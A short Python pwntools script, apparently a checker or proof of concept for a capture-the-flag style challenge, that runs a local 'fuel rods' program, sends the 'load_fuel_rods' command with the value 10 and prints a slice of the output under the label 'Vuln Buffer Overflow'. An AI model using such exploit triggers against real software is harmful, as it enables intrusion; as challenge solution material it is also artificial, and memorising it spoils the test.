#!/usr/bin/python3

from pwn import *
import os
import warnings

def main():
    warnings.filterwarnings("ignore", category=BytesWarning)
    context.log_level = 'error'

    env = os.environ.copy()
    env['LD_LIBRARY_PATH'] = './runner/external/'

    output = b''

    for _ in range(3):
        pid = process(['./runner/run.sh'], env=env)
        pid.recvuntil(b'\x00', timeout=1.0)
        pid.sendline(b'load_fuel_rods')
        pid.sendline(b'10')

        output = pid.recvrepeat(timeout=1.2)
        pid.close()

    print(text.red("[+]") + " Vuln Buffer Overflow - load_fuel_rods:")
    print(output.splitlines()[3][12:-2])
    print()


if __name__ == "__main__":
    main()